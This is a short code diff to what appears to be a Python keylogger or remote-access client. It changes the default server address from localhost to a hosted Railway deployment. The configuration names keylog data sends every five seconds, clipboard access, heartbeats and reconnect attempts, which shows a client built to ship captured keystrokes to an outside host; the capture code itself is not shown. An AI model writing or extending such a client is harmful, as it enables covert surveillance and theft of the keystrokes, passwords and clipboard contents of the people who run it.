@@ -38,15 +38,16 @@ except ImportError:
         CLIPBOARD_AVAILABLE = False
 
 # Configuration
-SERVER_IP = os.environ.get('SERVER_IP', '127.0.0.1')  # Change to your server's IP address or domain
+SERVER_IP = os.environ.get('SERVER_IP', 'pablosboson-server-production.up.railway.app')  # Default to Railway deployment
 SERVER_PORT = int(os.environ.get('SERVER_PORT', '5000'))  # Must match server.py port
 RECONNECT_DELAY = 10     # Seconds between reconnection attempts
 HEARTBEAT_INTERVAL = 30  # Seconds between heartbeats
 KEYLOG_INTERVAL = 5      # Seconds between keylog data sends
 
-# To connect to a remote server, set the SERVER_IP environment variable
+# To connect to a different server, set the SERVER_IP environment variable
 # Example: set SERVER_IP=yourapp.onrender.com (on Windows)
 # Example: export SERVER_IP=yourapp.onrender.com (on Linux/Mac)
+# Default: Uses Railway deployment URL
 
 class Client:
     def __init__(self):
